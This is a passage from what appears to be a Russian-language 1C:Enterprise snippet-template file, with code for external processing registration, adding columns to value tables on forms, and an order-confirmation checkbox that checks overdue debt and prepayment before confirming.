{"ЗаполнениеОбъекта изменение элементов таблицы",0,0,"","&НаКлиенте
Процедура ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначенияМассив) Экспорт
	
	ВладелецФормыОбъект = ВладелецФормы.Объект;
	
	ЗаполнитьОбъект(ВладелецФормыОбъект);
	
КонецПроцедуры // ВыполнитьКоманду()

&НаКлиенте
Функция ЗаполнитьОбъект(ВладелецФормыОбъект)
	
	Для каждого ТекущаяСтрока из ВладелецФормыОбъект.ИмяТаблицы Цикл
		ТекущаяСтрока.Количество = 100;
	КонецЦикла;
	
КонецФункции"}
}
},
{1,
{"Внешние обработки",1,0,"",""},
{0,
{"Настройка внешней обработки",0,0,"","Функция СведенияОВнешнейОбработке() Экспорт

	СведенияОбОбработке = Новый Структура;
	//	1. Вид - вид обработки.
	//	Тип данных - строка, допустимо одно из 6 значений.
	//	Значения.
	//	1) Глобальные - ""ДополнительнаяОбработка"", ""ДополнительныйОтчет""
	//	2) Назначаемые - ""ЗаполнениеОбъекта"", ""Отчет"", ""ПечатнаяФорма"" или ""СозданиеСвязанныхОбъектов"".
	СведенияОбОбработке.Вставить(""Вид"", ""<?""Вид обработки"", ВыборВарианта, ""Дополнительная обработка"", ""ДополнительнаяОбработка"", ""Дополнительный отчет"", ""ДополнительныйОтчет"", ""Заполнение объекта"", ""ЗаполнениеОбъекта"", ""Отчет"", ""Отчет"", ""Печатная форма"", ""ПечатнаяФорма"", ""Создание связанных объектов"", ""СозданиеСвязанныхОбъектов"">"");

	//	2. Назначение - объект, для которого назначается данная обработка, 
	//	Массив строк имен объектов метаданных.
	//	Примеры значений массива - ""Документ.АвансовыйОтчет"" или ""Справочник.*"", где * - означает все объекта данного вида.
	//	Для глобальных (не назначаемых) обработок параметр не имеет смысла.
	ОбъектыМетаданных = Новый Массив;                  
	ОбъектыМетаданных.Добавить(""Документ.<?""Назначение обработки"", Документ>"");
	СведенияОбОбработке.Вставить(""Назначение"", ОбъектыМетаданных);
	
	//	3. Наименование - название обработки, произвольное наименование
	//	Тип данных - произвольная строка.
	//	Данное наименование будет отображаться в списке дополнительных обработок.
	СведенияОбОбработке.Вставить(""Наименование "", ""<?""Наименование обработки"">"");
	
	//	4. Версия - номер версии обработки
	//	Тип данных - строка в формате ""ХХ.ХХ"".
	//	Обозначает версию данной обработки, данная версия будет отображаться в списке дополнительных отчетов и обработок.
	СведенияОбОбработке.Вставить(""Версия "", ""1.0"");
	
	//	5. БезопасныйРежим - режим контроля прав пользователя.
	//	Тип данных - булево.
	СведенияОбОбработке.Вставить(""БезопасныйРежим"", <?""Безопасный режим"", ВыборВарианта, ""Да"", ""Истина"", ""Нет"", ""Ложь"">);
	
	//	6. Информация - краткое описание обработки.
	//	Тип данных - строка.
	//	Данное описание будет отображаться в списке дополнительных обработок.
	СведенияОбОбработке.Вставить(""Информация"", ""<?""Информация о обработке"">"");
	
	//	7. Команды - действия предоставляемые обработкой.
	//	Тип данных - таблица значений.
	//	Таблица содержит 5 колонок:
	//	1) Представление. Наименование команды в пользовательском интерфейсе;
	//	2) Идентификатор. Для печатных форм список макетов, для остальных обработок любая строка, уникальная для данной обработки.
	//	3) Использование. Строка, одно из значений - 
	//		- ОткрытиеФормы. Открывает форму обработки.
	//		- ВызовКлиентскогоМетода. Вызов клиентского экспортного метода модуля формы
	//		- ВызовСерверногоМетода. Вызов экспортного серверного метода модуля объекта.
	//		Для внешних печатных форм нужно указывать последнее значение.
	//	4) ПоказыватьОповещение. Булево, нужно ли показывать оповещение при начале и окончании действия.
	//	5) Модификатор. Для внешних печатных форм должно содержаться значение ""ПечатьMXL"".
	ТаблицаКоманд = ПолучитьТаблицуКоманд();
	ДобавитьКоманду(ТаблицаКоманд, ""<?""Представление. Наименование команды в пользовательском интерфейсе"">"", ""<?""Идентификатор. Для печатных форм список макетов, для остальных обработок любая строка, уникальная для данной обработки."">"", ""<?""Использование"", ВыборВарианта, ""Открытие формы"", ""ОткрытиеФормы"", ""Вызов клиентского метода"", ""ВызовКлиентскогоМетода"", ""Вызов серверного метода"", ""ВызовСерверногоМетода"">"");
	СведенияОбОбработке.Вставить(""Команды"", ТаблицаКоманд);
	
	Возврат СведенияОбОбработке;
	
КонецФункции // СведенияОВнешнейОбработке()

Функция ПолучитьТаблицуКоманд()

	ТаблицаКоманд = Новый ТаблицаЗначений;
	ТаблицаКоманд.Колонки.Добавить(""Представление"", Новый ОписаниеТипов(""Строка""));
	ТаблицаКоманд.Колонки.Добавить(""Идентификатор"", Новый ОписаниеТипов(""Строка""));
	ТаблицаКоманд.Колонки.Добавить(""Использование"", Новый ОписаниеТипов(""Строка""));
	ТаблицаКоманд.Колонки.Добавить(""ПоказыватьОповещение"", Новый ОписаниеТипов(""Булево""));
	ТаблицаКоманд.Колонки.Добавить(""Модификатор"", Новый ОписаниеТипов(""Строка""));

	Возврат ТаблицаКоманд;

КонецФункции

Процедура ДобавитьКоманду(ТаблицаКоманд, Представление, Идентификатор, Использование, ПоказыватьОповещение = Ложь, Модификатор = """")

	НоваяКоманда = ТаблицаКоманд.Добавить();
	НоваяКоманда.Представление = Представление;
	НоваяКоманда.Идентификатор = Идентификатор;
	НоваяКоманда.Использование = Использование;
	НоваяКоманда.ПоказыватьОповещение = ПоказыватьОповещение;
	НоваяКоманда.Модификатор = Модификатор;
  
КонецПроцедуры

Процедура ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначения, СозданныеОбъекты) Экспорт
	
	

КонецПроцедуры
"}
}
}
},
{15,
{"Программно",1,0,"",""},
{3,
{"Таблица значений",1,0,"",""},
{0,
{"Колонка в таблицу значений (УФ)",0,0,"","Если НЕ РезультатЗапроса.Пустой() Тогда
	РезультатЗапросаТЗ = РезультатЗапроса.Выгрузить();
	РезультатЗапросаТЗКолонки = РезультатЗапросаТЗ.Колонки;
	
	Для каждого ИмяКолонки Из РезультатЗапросаТЗКолонки Цикл
		//Таблица.Колонки.Добавить(ИмяКолонки);
		ДобавитьКолонкуНаСервере(ИмяКолонки.Имя, ИмяКолонки.ТипЗначения, ИмяКолонки.Заголовок, ""Таблица"", Элементы.Таблица); 
	КонецЦикла;
	
	Таблица.Загрузить(РезультатЗапросаТЗ);
КонецЕсли;

//Процедура программно добавит колонку в таблицу
//-------------------------------------------------------------------------
//Параметры:
//		ИмяКолонки - Строка - вида ""Тест3""
//		ОписаниеТипов - ОписаниеТипов - напр., ""Строка""
//		Заголовок - Строка - напр., ""Пример""
//		Реквизит - Строка - Путь к реквизиту, напр ""Таблица"" или ""Объект.Таблица""
//		ЭлементыРеквизит - ТаблицаФормы - Путь к элементу на форме
//-------------------------------------------------------------------------
//автор: Кучеров Р 28.05.2018 
&НаСервере
Процедура ДобавитьКолонкуНаСервере(ИмяКолонки, ОписаниеТипов, Заголовок, Реквизит, ЭлементыРеквизит, Видимость = Истина)
	
	Если Элементы.Найти(ИмяКолонки) = Неопределено Тогда
		нРеквизиты 	= Новый Массив;
		нРеквизиты.Добавить(Новый РеквизитФормы(ИмяКолонки, Новый ОписаниеТипов(ОписаниеТипов), Реквизит, Заголовок, Истина));
		ИзменитьРеквизиты(нРеквизиты);
		
		нЭлемент 		= Элементы.Добавить(ИмяКолонки, Тип(""ПолеФормы""), ЭлементыРеквизит);
		нЭлемент.Вид 	= ВидПоляФормы.ПолеВвода;
		//нЭлемент.ПутьКДанным 	= Реквизит + ""."" + ИмяКолонки; //Это разве работает!?
		нЭлемент.ПутьКДанным 	= Реквизит + ""."" + ИмяКолонки;
		нЭлемент.Подсказка 		= Заголовок;
		нЭлемент.Видимость 		= Видимость;
	КонецЕсли; 
	
КонецПроцедуры
"}
},
{0,
{"Колонка в таблицу значений (ОФ)",0,0,"","ЭлементСписок 	= ЭлементыФормы.<?""Имя таблицы"">;

ТекПозиция 		= 0;
НовКолонка 		= ЭлементСписок.Колонки.Вставить(ТекПозиция + 1);
НовКолонка.Имя 	= ""КартинкаНаличие"";
НовКолонка.Данные 		= """";
НовКолонка.ТекстШапки 	= ""А"";
НовКолонка.Ширина 		= 26;"}
},
{0,
{"ВывестиТаблицуНаФорму",0,0,"","&НаСервере
Процедура ВывестиТаблицуНаФорму(УФ,ИмяТЗНаФорме,ТЗ, ТЗОбработчиковСобытий = Неопределено) Экспорт
    
    // СОЗДАНИЕ РЕКВИЗИТОВ ФОРМЫ
    МассивДобавляемыхРеквизитов = Новый Массив; 
    
    Для Каждого Колонка Из ТЗ.Колонки Цикл
        МассивДобавляемыхРеквизитов.Добавить(Новый РеквизитФормы(Колонка.Имя, Колонка.ТипЗначения,ИмяТЗНаФорме ,Колонка.Заголовок));    
    КонецЦикла; 
    
    МассивУдаляемыхРеквизитов = УФ.ПолучитьРеквизиты(ИмяТЗНаФорме);
    МассивИменУдаляемыхРеквизитов = Новый Массив;
    
    Для каждого Элемент Из МассивУдаляемыхРеквизитов Цикл
        МассивИменУдаляемыхРеквизитов.Добавить(ИмяТЗНаФорме + ""."" + Элемент.Имя);
    КонецЦикла; 
    
    УФ.ИзменитьРеквизиты(МассивДобавляемыхРеквизитов,МассивИменУдаляемыхРеквизитов); 
    
    // СОЗДАНИЕ ЭЛЕМЕНТОВ ФОРМЫ
    Для каждого Элемент Из МассивУдаляемыхРеквизитов Цикл
        УдаляемыйЭлемент = УФ.Элементы.Найти(ИмяТЗНаФорме + Элемент.Имя);
        УФ.Элементы.Удалить(УдаляемыйЭлемент);
    КонецЦикла; 
    
    Для Каждого Колонка Из ТЗ.Колонки Цикл
        НоваяКолонка = УФ.Элементы.Добавить(ИмяТЗНаФорме + Колонка.Имя, Тип(""ПолеФормы""), УФ.Элементы[ИмяТЗНаФорме]); 
        НоваяКолонка.Заголовок = Колонка.Заголовок; 
        НоваяКолонка.ПутьКДанным = ИмяТЗНаФорме + ""."" + Колонка.Имя;
        НоваяКолонка.Вид = ВидПоляФормы.ПолеВвода; 
        НоваяКолонка.РежимРедактирования = РежимРедактированияКолонки.ВходПриВводе;    
    КонецЦикла;     
    
    УФ[ИмяТЗНаФорме].Загрузить(ТЗ);
    
    // Привязка обработчиков событий
    Если ТЗОбработчиковСобытий = Неопределено Тогда
        Возврат;
    КонецЕсли;    
    
    Для Каждого Строка Из ТЗОбработчиковСобытий Цикл
        УФ.Элементы[Строка.ИмяЭлемента].УстановитьДействие(Строка.ИмяСобытия, Строка.ИмяЭлемента + Строка.ИмяСобытия); 
    КонецЦикла;    
    
КонецПроцедуры"}
}
},
{6,
{"Обычне формы",1,0,"",""},
{0,
{"Флаг ЗаказПодтвержден",0,0,"","//++(
Флажок = ЭлементыФормы.Добавить(Тип(""Флажок""), ""ЗаказПодтвержден"",,);
Флажок.Заголовок = ""Заказ подтвержден"";
Флажок.Данные = ""ЗаказПодтвержден"";
Флажок.Лево = ЭлементыФормы.ОтражатьВБухгалтерскомУчете.Лево;
Флажок.Верх = ЭлементыФормы.Организация.Верх;
Флажок.Ширина = 120;
Флажок.УстановитьПривязку(ГраницаЭлементаУправления.Лево,ЭлементыФормы.Организация,ГраницаЭлементаУправления.Право);
Флажок.УстановитьПривязку(ГраницаЭлементаУправления.Право,Флажок,ГраницаЭлементаУправления.Лево);
Флажок.УстановитьДействие(""ПриИзменении"", новый Действие(""ЗаказПодтвержденПриИзменении""));

Надпись = ЭлементыФормы.Добавить(Тип(""Надпись""), ""НадписьДатаПодтверждения"",,);
Надпись.Заголовок = ""Дата подтверждения:"";
Надпись.Лево = Флажок.Лево+Флажок.Ширина+7;
Надпись.Верх = ЭлементыФормы.Организация.Верх;
Надпись.Ширина = 115;
Надпись.УстановитьПривязку(ГраницаЭлементаУправления.Лево,Флажок,ГраницаЭлементаУправления.Право);
Надпись.УстановитьПривязку(ГраницаЭлементаУправления.Право,Надпись ,ГраницаЭлементаУправления.Лево);

Реквизит = ЭлементыФормы.Добавить(Тип(""ПолеВвода""), ""ДатаПодтверждения"",,);
Реквизит.Данные = ""ДатаПодтверждения"";
Реквизит.Лево = Надпись.Лево+Надпись.Ширина+2;
Реквизит.Верх = ЭлементыФормы.Организация.Верх;
Реквизит.Ширина = 95;
Реквизит.УстановитьПривязку(ГраницаЭлементаУправления.Лево,Надпись,ГраницаЭлементаУправления.Право);
Реквизит.УстановитьПривязку(ГраницаЭлементаУправления.Право,ЭлементыФормы.ДоговорКонтрагента ,ГраницаЭлементаУправления.Право);

ЭлементыФормы.Склад.АвтоОтметкаНезаполненного = Истина;

ЭлементыФормы.ЗаказПодтвержден.Доступность  = НЕ ЗаказПодтвержден;
ЭлементыФормы.ДатаПодтверждения.Доступность = НЕ ЗаказПодтвержден;

Если ЭтоНовый() Тогда
	ЗаказПодтвержден = Ложь;
	ДатаПодтверждения = Дата(1,1,1,0,0,0);
КонецЕсли;	

ЭлементыФормы.ДействияФормы.Кнопки.Вставить(26, , ТипКнопкиКоманднойПанели.Разделитель, , );
ЭлементыФормы.ДействияФормы.Кнопки.Вставить(27, ""ОформитьПакетДокументов"", ТипКнопкиКоманднойПанели.Действие,""Оформить пакет документов"", новый Действие(""ОформитьПакетДокументовНажатие""));

ЭлементыФормы.ДействияФормы.Кнопки.ОформитьПакетДокументов.Доступность = (Организация.Наименование = ""ИП Вафин А.Ю."");

ПредЗаказПодтвержден = ЗаказПодтвержден;

Если НЕ ЭтоНовый() Тогда
	СТИВ_Доработки.ЗаписатьФактОткрытияОбъектаВИсторию(Ссылка);
КонецЕсли;
//++)

Процедура ЗаказПодтвержденПриИзменении(Элемент) //++
	
	Если ЗаказПодтвержден Тогда
	//___проверка на просрочку по договору_______	
		Запрос = Новый Запрос;
		Запрос.Текст = ""ВЫБРАТЬ РАЗРЕШЕННЫЕ
		               |	ВзаиморасчетыОстатки.Организация КАК Организация,
		               |	ВзаиморасчетыОстатки.Контрагент КАК Контрагент,
		               |	ВзаиморасчетыОстатки.ДоговорКонтрагента КАК ДоговорКонтрагента,
		               |	СУММА(ВзаиморасчетыОстатки.СуммаВзаиморасчетовОстаток) КАК ОбщаяСуммаДолга,
		               |	ВзаиморасчетыОстатки.ДоговорКонтрагента.ДопустимоеЧислоДнейЗадолженности КАК СрокОплаты
		               |ПОМЕСТИТЬ Остатки
		               |ИЗ
		               |	РегистрНакопления.ВзаиморасчетыСКонтрагентами.Остатки(
		               |			,
		               |			ДоговорКонтрагента = &ДоговорКонтрагента
		               |				И НЕ Контрагент В
		               |						(ВЫБРАТЬ
		               |							СобственныеКонтрагенты.Контрагент
		               |						ИЗ
		               |							РегистрСведений.СобственныеКонтрагенты КАК СобственныеКонтрагенты)) КАК ВзаиморасчетыОстатки
		               |
		               |СГРУППИРОВАТЬ ПО
		               |	ВзаиморасчетыОстатки.Организация,
		               |	ВзаиморасчетыОстатки.Контрагент,
		               |	ВзаиморасчетыОстатки.ДоговорКонтрагента.ДопустимоеЧислоДнейЗадолженности,
		               |	ВзаиморасчетыОстатки.ДоговорКонтрагента
		               |
		               |ИМЕЮЩИЕ
		               |	СУММА(ВзаиморасчетыОстатки.СуммаВзаиморасчетовОстаток) > 0
		               |;
		               |
		               |////////////////////////////////////////////////////////////////////////////////
		               |ВЫБРАТЬ РАЗРЕШЕННЫЕ
		               |	ВзаиморасчетыОбороты.Период КАК Период,
		               |	ВзаиморасчетыОбороты.Организация КАК Организация,
		               |	ВзаиморасчетыОбороты.Контрагент КАК Контрагент,
		               |	ВзаиморасчетыОбороты.ДоговорКонтрагента КАК ДоговорКонтрагента,
		               |	ВЫБОР
		               |		КОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовПриход > 0
		               |			ТОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовПриход
		               |		ИНАЧЕ 0
		               |	КОНЕЦ + ВЫБОР
		               |		КОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовРасход < 0
		               |			ТОГДА -ВзаиморасчетыОбороты.СуммаВзаиморасчетовРасход
		               |		ИНАЧЕ 0
		               |	КОНЕЦ КАК СуммаУпрПриход,
		               |	Остатки.ОбщаяСуммаДолга КАК ОбщаяСуммаДолга
		               |ПОМЕСТИТЬ ОборотыПоДнямПриход
		               |ИЗ
		               |	Остатки КАК Остатки
		               |		ЛЕВОЕ СОЕДИНЕНИЕ РегистрНакопления.ВзаиморасчетыСКонтрагентами.Обороты(, , день, ДоговорКонтрагента = &ДоговорКонтрагента) КАК ВзаиморасчетыОбороты
		               |		ПО Остатки.Организация = ВзаиморасчетыОбороты.Организация
		               |			И Остатки.Контрагент = ВзаиморасчетыОбороты.Контрагент
		               |			И Остатки.ДоговорКонтрагента = ВзаиморасчетыОбороты.ДоговорКонтрагента
		               |ГДЕ
		               |	ВЫБОР
		               |			КОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовПриход > 0
		               |				ТОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовПриход
		               |			ИНАЧЕ 0
		               |		КОНЕЦ + ВЫБОР
		               |			КОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовРасход < 0
		               |				ТОГДА -ВзаиморасчетыОбороты.СуммаВзаиморасчетовРасход
		               |			ИНАЧЕ 0
		               |		КОНЕЦ > 0
		               |;
		               |
		               |////////////////////////////////////////////////////////////////////////////////
		               |ВЫБРАТЬ
		               |	ОборотыПоДнямПриход.Период КАК Период,
		               |	ОборотыПоДнямПриход.Организация КАК Организация,
		               |	ОборотыПоДнямПриход.Контрагент КАК Контрагент,
		               |	ОборотыПоДнямПриход.ДоговорКонтрагента КАК ДоговорКонтрагента,
		               |	СУММА(ОборотыПоДнямПриход1.СуммаУпрПриход) КАК СуммаУпрПриход
		               |ПОМЕСТИТЬ ОборотыБольшеОстаткаПриход
		               |ИЗ
		               |	ОборотыПоДнямПриход КАК ОборотыПоДнямПриход
		               |		ЛЕВОЕ СОЕДИНЕНИЕ ОборотыПоДнямПриход КАК ОборотыПоДнямПриход1
		               |		ПО ОборотыПоДнямПриход.Период <= ОборотыПоДнямПриход1.Период
		               |			И ОборотыПоДнямПриход.Организация = ОборотыПоДнямПриход1.Организация
		               |			И ОборотыПоДнямПриход.Контрагент = ОборотыПоДнямПриход1.Контрагент
		               |			И ОборотыПоДнямПриход.ДоговорКонтрагента = ОборотыПоДнямПриход1.ДоговорКонтрагента
		               |
		               |СГРУППИРОВАТЬ ПО
		               |	ОборотыПоДнямПриход.Период,
		               |	ОборотыПоДнямПриход.Организация,
		               |	ОборотыПоДнямПриход.Контрагент,
		               |	ОборотыПоДнямПриход.ДоговорКонтрагента,
		               |	ОборотыПоДнямПриход.ОбщаяСуммаДолга
		               |
		               |ИМЕЮЩИЕ
		               |	ОборотыПоДнямПриход.ОбщаяСуммаДолга <= СУММА(ОборотыПоДнямПриход1.СуммаУпрПриход)
		               |;
		               |
		               |////////////////////////////////////////////////////////////////////////////////
		               |ВЫБРАТЬ
		               |	МАКСИМУМ(ОборотыБольшеОстаткаПриход.Период) КАК Период,
		               |	ОборотыБольшеОстаткаПриход.Организация,
		               |	ОборотыБольшеОстаткаПриход.Контрагент,
		               |	ОборотыБольшеОстаткаПриход.ДоговорКонтрагента
		               |ПОМЕСТИТЬ ДатыОбразованияДт
		               |ИЗ
		               |	ОборотыБольшеОстаткаПриход КАК ОборотыБольшеОстаткаПриход
		               |
		               |СГРУППИРОВАТЬ ПО
		               |	ОборотыБольшеОстаткаПриход.Организация,
		               |	ОборотыБольшеОстаткаПриход.Контрагент,
		               |	ОборотыБольшеОстаткаПриход.ДоговорКонтрагента
		               |;
		               |
		               |////////////////////////////////////////////////////////////////////////////////
		               |ВЫБРАТЬ
		               |	Остатки.Организация КАК Организация,
		               |	Остатки.Контрагент КАК Контрагент,
		               |	Остатки.ДоговорКонтрагента КАК ДоговорКонтрагента,
		               |	ДатыОбразованияДт.Период КАК ДатаОбразованияДолга,
		               |	РАЗНОСТЬДАТ(ДатыОбразованияДт.Период, &Период, ДЕНЬ) КАК КоличествоДнейЗадолженности,
		               |	Остатки.ОбщаяСуммаДолга КАК ОбщаяСуммаДолга,
		               |	ВЫБОР
		               |		КОГДА Остатки.СрокОплаты <> 0
		               |			ТОГДА ВЫБОР
		               |					КОГДА ДатыОбразованияДт.Период < НАЧАЛОПЕРИОДА(ДОБАВИТЬКДАТЕ(&Период, ДЕНЬ, -Остатки.СрокОплаты), ДЕНЬ)
		               |						ТОГДА ДОБАВИТЬКДАТЕ(&Период, ДЕНЬ, -Остатки.СрокОплаты)
		               |					ИНАЧЕ ДатыОбразованияДт.Период
		               |				КОНЕЦ
		               |		ИНАЧЕ &Период
		               |	КОНЕЦ КАК ДатаНачалаНеПросрочки,
		               |	ВЫБОР
		               |		КОГДА Остатки.СрокОплаты <> 0
		               |			ТОГДА ВЫБОР
		               |					КОГДА ДатыОбразованияДт.Период < НАЧАЛОПЕРИОДА(ДОБАВИТЬКДАТЕ(&Период, ДЕНЬ, -Остатки.СрокОплаты), ДЕНЬ)
		               |						ТОГДА ДОБАВИТЬКДАТЕ(&Период, ДЕНЬ, -Остатки.СрокОплаты)
		               |					ИНАЧЕ ДАТАВРЕМЯ(1, 1, 1, 0, 0, 0)
		               |				КОНЕЦ
		               |		ИНАЧЕ &Период
		               |	КОНЕЦ КАК ДатаНачалаПросрочки
		               |ПОМЕСТИТЬ ИтогоОстатки
		               |ИЗ
		               |	Остатки КАК Остатки
		               |		ЛЕВОЕ СОЕДИНЕНИЕ ДатыОбразованияДт КАК ДатыОбразованияДт
		               |		ПО Остатки.Организация = ДатыОбразованияДт.Организация
		               |			И Остатки.Контрагент = ДатыОбразованияДт.Контрагент
		               |			И Остатки.ДоговорКонтрагента = ДатыОбразованияДт.ДоговорКонтрагента
		               |
		               |СГРУППИРОВАТЬ ПО
		               |	Остатки.Организация,
		               |	Остатки.Контрагент,
		               |	Остатки.ДоговорКонтрагента,
		               |	ДатыОбразованияДт.Период,
		               |	Остатки.ОбщаяСуммаДолга,
		               |	ВЫБОР
		               |		КОГДА Остатки.СрокОплаты <> 0
		               |			ТОГДА ВЫБОР
		               |					КОГДА ДатыОбразованияДт.Период < НАЧАЛОПЕРИОДА(ДОБАВИТЬКДАТЕ(&Период, ДЕНЬ, -Остатки.СрокОплаты), ДЕНЬ)
		               |						ТОГДА ДОБАВИТЬКДАТЕ(&Период, ДЕНЬ, -Остатки.СрокОплаты)
		               |					ИНАЧЕ ДатыОбразованияДт.Период
		               |				КОНЕЦ
		               |		ИНАЧЕ &Период
		               |	КОНЕЦ,
		               |	ВЫБОР
		               |		КОГДА Остатки.СрокОплаты <> 0
		               |			ТОГДА ВЫБОР
		               |					КОГДА ДатыОбразованияДт.Период < НАЧАЛОПЕРИОДА(ДОБАВИТЬКДАТЕ(&Период, ДЕНЬ, -Остатки.СрокОплаты), ДЕНЬ)
		               |						ТОГДА ДОБАВИТЬКДАТЕ(&Период, ДЕНЬ, -Остатки.СрокОплаты)
		               |					ИНАЧЕ ДАТАВРЕМЯ(1, 1, 1, 0, 0, 0)
		               |				КОНЕЦ
		               |		ИНАЧЕ &Период
		               |	КОНЕЦ
		               |;
		               |
		               |////////////////////////////////////////////////////////////////////////////////
		               |ВЫБРАТЬ РАЗРЕШЕННЫЕ РАЗЛИЧНЫЕ
		               |	ИтогоОстатки.Организация КАК Организация,
		               |	ИтогоОстатки.Контрагент КАК Контрагент,
		               |	ИтогоОстатки.ДоговорКонтрагента КАК ДоговорКонтрагента,
		               |	ИтогоОстатки.ДатаОбразованияДолга КАК ДатаОбразованияДолга,
		               |	ИтогоОстатки.КоличествоДнейЗадолженности КАК КоличествоДнейЗадолженности,
		               |	ИтогоОстатки.ОбщаяСуммаДолга КАК ОбщаяСуммаДолга,
		               |	ВЫБОР
		               |		КОГДА ИтогоОстатки.ДатаНачалаНеПросрочки > ВзаиморасчетыОбороты.Период
		               |			ТОГДА ВЫБОР
		               |					КОГДА ИтогоОстатки.ОбщаяСуммаДолга - ЕСТЬNULL(СУММА(ВЫБОР
		               |									КОГДА ИтогоОстатки.ДатаНачалаНеПросрочки <= ВзаиморасчетыОбороты.Период
		               |										ТОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовПриход + ВЫБОР
		               |												КОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовРасход < 0
		               |													ТОГДА -ВзаиморасчетыОбороты.СуммаВзаиморасчетовРасход
		               |												ИНАЧЕ 0
		               |											КОНЕЦ
		               |									ИНАЧЕ 0
		               |								КОНЕЦ), 0) < 0
		               |						ТОГДА 0
		               |					ИНАЧЕ ИтогоОстатки.ОбщаяСуммаДолга - ЕСТЬNULL(СУММА(ВЫБОР
		               |									КОГДА ИтогоОстатки.ДатаНачалаНеПросрочки <= ВзаиморасчетыОбороты.Период
		               |										ТОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовПриход + ВЫБОР
		               |												КОГДА ВзаиморасчетыОбороты.СуммаВзаиморасчетовРасход < 0
		               |													ТОГДА -ВзаиморасчетыОбороты.СуммаВзаиморасчетовРасход
		               |												ИНАЧЕ 0
		               |											КОНЕЦ
		               |									ИНАЧЕ 0
		               |								КОНЕЦ), 0)
		               |				КОНЕЦ
		               |		ИНАЧЕ 0
		               |	КОНЕЦ КАК ОбщаяСуммаПросроченногоДолга,
		               |	ВЫБОР
		               |		КОГДА ИтогоОстатки.ДатаНачалаНеПросрочки > ВзаиморасчетыОбороты.Период
		               |			ТОГДА РАЗНОСТЬДАТ(ИтогоОстатки.ДатаОбразованияДолга, ИтогоОстатки.ДатаНачалаНеПросрочки, ДЕНЬ)
		               |		ИНАЧЕ 0
		               |	КОНЕЦ КАК КоличествоПросроченныхДней
		               |ИЗ
		               |	ИтогоОстатки КАК ИтогоОстатки
		               |		ЛЕВОЕ СОЕДИНЕНИЕ РегистрНакопления.ВзаиморасчетыСКонтрагентами.Обороты(, , Регистратор, ДоговорКонтрагента = &ДоговорКонтрагента) КАК ВзаиморасчетыОбороты
		               |		ПО ИтогоОстатки.Организация = ВзаиморасчетыОбороты.Организация
		               |			И ИтогоОстатки.Контрагент = ВзаиморасчетыОбороты.Контрагент
		               |			И ИтогоОстатки.ДоговорКонтрагента = ВзаиморасчетыОбороты.ДоговорКонтрагента
		               |ГДЕ
		               |	ВзаиморасчетыОбороты.Период >= ИтогоОстатки.ДатаОбразованияДолга
		               |	И (ЕСТЬNULL(ВзаиморасчетыОбороты.СуммаУпрПриход, 0) > 0
		               |			ИЛИ ЕСТЬNULL(ВзаиморасчетыОбороты.СуммаУпрРасход, 0) < 0)
		               |
		               |СГРУППИРОВАТЬ ПО
		               |	ИтогоОстатки.Организация,
		               |	ИтогоОстатки.Контрагент,
		               |	ИтогоОстатки.ДоговорКонтрагента,
		               |	ИтогоОстатки.ДатаОбразованияДолга,
		               |	ИтогоОстатки.КоличествоДнейЗадолженности,
		               |	ИтогоОстатки.ОбщаяСуммаДолга,
		               |	ИтогоОстатки.ДатаНачалаНеПросрочки,
		               |	ВзаиморасчетыОбороты.Период"";
		
		Запрос.УстановитьПараметр(""ДоговорКонтрагента"", ДоговорКонтрагента);
		Запрос.УстановитьПараметр(""Период"", ТекущаяДата());
		
		Выборка = Запрос.Выполнить().Выбрать();
		
		ЕстьПросрочка = ложь;
		Пока Выборка.Следующий() Цикл
			Если Выборка.ОбщаяСуммаПросроченногоДолга<>0 Тогда
				Сообщить(""По договору ""+ДоговорКонтрагента+"" Сумма просроченного долга = ""+Выборка.ОбщаяСуммаПросроченногоДолга+"" ""+ДоговорКонтрагента.ВалютаВзаиморасчетов);
				Если не РольДоступна(""ПолныеПрава"") И НЕ РольДоступна(""ПодтверждениеЗаказовБезПредоплаты"") Тогда
					ЕстьПросрочка = Истина;
				КонецЕсли;
			КонецЕсли;
		КонецЦикла;
		Если Не ЕстьПросрочка Тогда
			ДатаПодтверждения = ТекущаяДата();	
		Иначе
			ЗаказПодтвержден = Ложь;
		КонецЕсли;
		
		//____проверка предоплаты по заказу_________
		Если ДоговорКонтрагента.ПроцентПредоплаты<>0 Тогда
		    Запрос = Новый Запрос;
			Запрос.Текст = ""ВЫБРАТЬ РАЗРЕШЕННЫЕ
			               |	ВзаиморасчетыОстатки.Сделка,
			               |	СУММА(ВзаиморасчетыОстатки.СуммаВзаиморасчетовОстаток) КАК СуммаДолга
			               |ИЗ
			               |	РегистрНакопления.ВзаиморасчетыСКонтрагентами.Остатки(, Сделка = &Сделка) КАК ВзаиморасчетыОстатки
			               |
			               |СГРУППИРОВАТЬ ПО
			               |	ВзаиморасчетыОстатки.Сделка"";
			
			Запрос.УстановитьПараметр(""Сделка"", Ссылка);
			
			Выборка = Запрос.Выполнить().Выбрать();
			
			ЕстьПредоплата = Ложь;
			СкммаПредоплаты = ДоговорКонтрагента.ПроцентПредоплаты*СуммаДокумента/100;
			
			Если Выборка.Следующий() Тогда
				СуммаДолга = Выборка.СуммаДолга;
			Иначе
				СуммаДолга = СуммаДокумента;
			КонецЕсли;
			
			Если СуммаДокумента -(СуммаДокумента + СуммаДолга) < СкммаПредоплаты Тогда
				Сообщить(""По заказу покупателя необходима предоплата в размере не менее ""+формат(СкммаПредоплаты, ""ЧДЦ=2"")+"" ""+Ссылка.ВалютаДокумента, СтатусСообщения.Важное);
				Если НЕ РольДоступна(""ПолныеПрава"") И НЕ РольДоступна(""ПодтверждениеЗаказовБезПредоплаты"") Тогда
					ЕстьПредоплата = Ложь;
				Иначе
					ЕстьПредоплата = Истина;
				КонецЕсли;
			Иначе
				 ЕстьПредоплата = Истина;
			КонецЕсли;
				
			Если ЕстьПредоплата Тогда
				ДатаПодтверждения = ТекущаяДата();	
			Иначе
				ЗаказПодтвержден = Ложь;
			КонецЕсли;
		КонецЕсли;	
	КонецЕсли;
	
	ЭлементыФормы.Контрагент.ТолькоПросмотр 		= ЗаказПодтвержден;
